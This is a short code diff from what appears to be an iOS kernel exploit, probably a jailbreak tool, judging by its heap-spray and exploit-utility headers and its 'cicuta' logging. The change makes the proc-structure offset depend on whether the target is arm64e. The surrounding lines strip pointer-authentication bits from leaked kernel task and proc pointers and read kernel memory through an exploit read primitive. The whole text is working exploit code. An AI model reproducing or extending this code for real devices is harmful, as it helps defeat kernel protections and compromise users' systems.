@@ -14,6 +14,11 @@
 #include "include/fake_element_spray.h"
 #include "include/exploit_utilities.h"
 #include "include/File.h"
+#ifdef __arm64e__
+    uint64_t proc_pac_arm = 0x3A0;
+#else
+    uint64_t proc_pac_arm = 0x390;
+#endif
 typedef volatile struct {
     uint32_t ip_bits;
     uint32_t ip_references;
@@ -377,13 +382,8 @@ stage1:
     cicuta_log("task PAC: 0x%llx", task_pac);
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
-    /*#ifdef __arm64e__
-        printf("detected arm64e!");
-        uint64_t proc_pac = read_64(task + 0x3A0);
-    #else
-        uint64_t proc_pac = read_64(task + 0x390);
-    #endif*/
-    uint64_t proc_pac = read_64(task + 0x3A0);
+    cicuta_log("%llx", proc_pac_arm);
+    uint64_t proc_pac = read_64(task + proc_pac_arm);
     cicuta_log("proc PAC: 0x%llx", proc_pac);
     uint64_t proc = proc_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
